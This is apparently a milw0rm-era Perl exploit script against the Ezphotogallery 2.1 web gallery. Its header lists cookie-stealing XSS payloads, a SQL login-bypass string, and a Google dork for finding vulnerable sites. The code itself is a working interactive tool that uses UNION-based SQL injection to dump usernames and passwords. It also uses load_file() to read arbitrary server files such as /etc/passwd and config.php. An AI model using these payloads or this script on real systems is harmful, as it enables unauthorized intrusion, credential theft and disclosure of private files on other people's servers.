#!/usr/bin/perl
#----------------------------------------------------------------
#
#Script : Ezphotogallery 2.1
#
#Type : Multiple Vulnerabilities ( Xss/Login Bypass/Sql injection Exploit/File Disclosure)
#
#Method : GET
#
#Alert : High
#
#Google Dork : "100% | 50% | 25%" "Back to gallery" inurl:"show.php?imageid="
#
#----------------------------------------------------------------
#
#Discovered by : Khashayar Fereidani a.k.a. Dr.Crash
#
#My Official Website : HTTP://FEREIDANI.IR
#
#Khashayar Fereidani Email : irancrash [ a t ] gmail [ d o t] com
#
#----------------------------------------------------------------
#
#Khashayar Fereidani Official Website : HTTP://FEREIDANI.IR
#
#----------------------------------------------------------------
#
#Script Download :  http://heanet.dl.sourceforge.net/sourceforge/ezphotogallery/ezphotogallery-2.1.zip
#
#----------------------------------------------------------------
#Xss Vulnerabilities :
#
#Xss 1 : gallery.php?galleryid=<script>alert(document.cookie)</script>
#Xss 2 : show.php?imageid=156&size="''<?>>""''<script>alert(document.cookie)</script>
#Xss 3 : show.php?imageid=<script>alert(document.cookie)</script>
#
#----------------------------------------------------------------
#Login Bypass :
#
#Insert in gallery.php
#
#User : admin ' or ' 1=1
#Password : Dr.Crash
#
#----------------------------------------------------------------
#Sql Injection :
#
#Injection 1 : show.php?imageid=<sql>
#----------------------------------------------------------------
#
#                        Tnx : God
#
#                     HTTP://IRCRASH.COM
#
#----------------------------------------------------------------

use LWP;
use HTTP::Request;
use Getopt::Long;
 
 
$scriptname="Ezphotogallery 2.1";

sub header
{
print "
****************************************************
* $scriptname
****************************************************
*Discovered by : Khashayar Fereidani               *
*Exploited by : Khashayar Fereidani                *
*My Official Website : http://fereidani.ir         *
****************************************************";
}
 
sub usage
{
  print "
* Usage : perl $0 http://Example/
****************************************************
";
}                                                                                  
 

$url = ($ARGV[0]);

if(!$url)
{
header();
usage();
exit;
}
if($url !~ /\//){$url = $url."/";}
if($url !~ /http:\/\//){$url = "http://".$url;}
sub xpl1()
{
#concat(0x4c6f67696e3a,user,0x3c656e64757365723e,0x0d0a50617373776f72643a,password,0x3c656e64706173733e)
$vul = "/show.php?imageid=999+union+select+0,1,2,concat(0x4c6f67696e3a,name,0x3c656e64757365723e,0x0d0a50617373776f72643a,password,0x3c656e64706173733e),4,5,6,7,8,9+from+users/*";
$requestpage = $url.$vul;

 
my $req  = HTTP::Request->new("POST",$requestpage);
$ua = LWP::UserAgent->new;
$ua->agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req->referer($url);
$req->referer("IRCRASH.COM");
$req->content_type('application/x-www-form-urlencoded');
$req->header("content-length" => $contlen);
$req->content($poststring);
 
$response = $ua->request($req);
$content = $response->content;
$header = $response->headers_as_string();
 
@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/<enduser>/,$name);
$name = @name[0];
 
@password = split(/Password:/,$content);
$password = @password[1];
@password = split(/<endpass>/,$password);
$password = @password[0];

if(!$name && !$password)
{
print "\n\n";
print "!Exploit failed ! :(\n\n";
exit;
}
 
print "\n Username: ".$name."\n\n";
print " Password: " .$password."\n\n";

 
}
 

#XPL2

sub xpl2()
{
print "\n Example For File Address : /home/user/public_html/config.php\n Or /etc/passwd";
print "\n Enter File Address :";
$fil3 = <stdin>;

$vul = "/show.php?imageid=999+union+select+0,1,2,concat(0x4c6f67696e3a,load_file('$fil3'),0x3c656e64757365723e),4,5,6,7,8,9+from+users/*";
$requestpage = $url.$vul;
 
my $req  = HTTP::Request->new("POST",$requestpage);
$ua = LWP::UserAgent->new;
$ua->agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req->referer($url);
$req->referer("IRCRASH.COM");
$req->content_type('application/x-www-form-urlencoded');
$req->header("content-length" => $contlen);
$req->content($poststring);
 
$response = $ua->request($req);
$content = $response->content;
$header = $response->headers_as_string();

 
@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/<enduser>/,$name);
$name = @name[0];


if(!$name && !$password)
{
print "\n\n";
print "!Exploit failed ! :(\n\n";
exit;
}
 
open (FILE, ">".source.".txt");
print FILE $name;
close (FILE);
print " File Save In source.txt\n";
print "";
 
}

#XPL2 END
#Starting;
print "
****************************************************
* $scriptname
****************************************************
*Discovered by : Khashayar Fereidani               *
*Exploited by : Khashayar Fereidani                *
*My Official Website : http://fereidani.ir         *
****************************************************
* Mod Options :                                    *
* Mod 1 : Find Script username and password        *
* Mod 2 : File Disclosure mode                     *
****************************************************";
print "\n \n Enter Mod : ";
$mod=<stdin>;
if ($mod=="1" or $mod=="2") { print "\n Exploiting .............. \n"; } else { print "\n Unknown Mod ! \n Exploit Failed !"; };
if ($mod=="1") { xpl1(); };
if ($mod=="2") { xpl2(); };

# milw0rm.com [2008-09-11]